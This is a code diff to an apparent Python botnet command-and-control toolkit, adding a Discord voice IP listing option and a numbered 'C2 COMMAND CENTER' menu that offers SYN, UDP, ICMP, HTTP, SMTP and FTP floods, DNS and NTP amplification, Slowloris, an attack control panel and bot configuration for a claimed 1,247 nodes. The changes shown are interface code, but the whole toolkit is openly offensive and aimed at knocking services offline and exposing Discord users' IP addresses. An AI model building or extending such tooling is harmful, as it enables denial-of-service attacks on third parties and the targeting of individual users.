@@ -816,8 +816,9 @@ def input_discord_params():
     print(f"{GRAY}|-{RESET} 1 - Extract IP from Discord Voice")
     print(f"{GRAY}|-{RESET} 2 - Analyze Discord Voice Connection")
     print(f"{GRAY}|-{RESET} 3 - Attack Voice IP & Port")
-    print(f"{GRAY}|-{RESET} 4 - Discord Voice Information")
-    print(f"{GRAY}|-{RESET} 5 - Return to C2 Menu")
+    print(f"{GRAY}|-{RESET} 4 - List Discord Voice IPs (includes port 19328)")
+    print(f"{GRAY}|-{RESET} 5 - Discord Voice Information")
+    print(f"{GRAY}|-{RESET} 6 - Return to C2 Menu")
     print()
 
     choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()
@@ -869,12 +870,19 @@ def input_discord_params():
 
     elif choice == '4':
         print()
+        animated_loader("Retrieving Discord Voice IP list...", 1)
+        print()
+        run_tool_with_args('layer7/discord_toolkit.py', 'list')
+        input(f"{RED}[C2]{RESET} Press Enter to return...")
+
+    elif choice == '5':
+        print()
         animated_loader("Retrieving Discord Voice information...", 1)
         print()
         run_tool_with_args('layer7/discord_toolkit.py', 'info')
         input(f"{RED}[C2]{RESET} Press Enter to return...")
 
-    elif choice == '5':
+    elif choice == '6':
         return
 
     else:
@@ -1402,6 +1410,52 @@ def execute_command(command, args):
     else:
         print(f"{RED}[ERROR]{RESET} {GRAY}Unknown command. Type !HELP for available commands.{RESET}")
 
+def c2_menu():
+    """Main C2 menu with numbered options"""
+    RED = '\033[91m'
+    GRAY = '\033[90m'
+    RESET = '\033[0m'
+
+    while True:
+        clear_screen()
+        print_banner()
+
+        print(f"{RED}+{'='*78}+{RESET}")
+        print(f"{RED}|{RESET} {RED}C2 COMMAND CENTER{RESET} {GRAY}| Status: {GRAY}ONLINE{RESET} {GRAY}| Nodes: {GRAY}1,247{RESET} {GRAY}|                 {RED}|{RESET}")
+        print(f"{RED}+{'='*78}+{RESET}")
+        print()
+
+        print(f"{RED}[LAYER 4 TOOLS]{RESET}")
+        print(f"{GRAY}|-{RESET} 1 - TCP SYN Flood")
+        print(f"{GRAY}|-{RESET} 2 - UDP Flood")
+        print(f"{GRAY}|-{RESET} 3 - ICMP Flood")
+        print(f"{GRAY}|-{RESET} 4 - TCP Connection Flood")
+        print()
+
+        print(f"{RED}[LAYER 7 TOOLS]{RESET}")
+        print(f"{GRAY}|-{RESET} 5 - HTTP Flood")
+        print(f"{GRAY}|-{RESET} 6 - DNS Amplification")
+        print(f"{GRAY}|-{RESET} 7 - SMTP Flood")
+        print(f"{GRAY}|-{RESET} 8 - FTP Flood")
+        print(f"{GRAY}|-{RESET} 9 - NTP Amplification")
+        print(f"{GRAY}|-{RESET} 10 - Slowloris Attack")
+        print(f"{GRAY}|-{RESET} 11 - Discord Voice Toolkit")
+        print()
+
+        print(f"{RED}[DDOS CONTROL]{RESET}")
+        print(f"{GRAY}|-{RESET} 12 - Attack Control Panel")
+        print()
+
+        print(f"{RED}[SYSTEM]{RESET}")
+        print(f"{GRAY}|-{RESET} 13 - Node Statistics")
+        print(f"{GRAY}|-{RESET} 14 - Bot Configuration")
+        print(f"{GRAY}|-{RESET} 15 - Install Dependencies")
+        print(f"{GRAY}|-{RESET} 16 - Exit")
+        print()
+
+        choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()
+        navigate_tree(choice)
+
 def main():
     RED = '\033[91m'
     GRAY = '\033[90m'
@@ -1409,8 +1463,17 @@ def main():
 
     clear_screen()
     print(f"{RED}[NETWORK TOOLKIT]{RESET}")
-    print(f"{GRAY}Type !HELP for available commands{RESET}")
+    print(f"{GRAY}Type !HELP for available commands or press Enter for menu mode{RESET}")
     print()
+
+    first_input = input(f"{RED}>{RESET} ").strip()
+
+    if not first_input:
+        c2_menu()
+    else:
+        command, args = parse_command(first_input)
+        if command:
+            execute_command(command, args)
 
     while True:
         try:
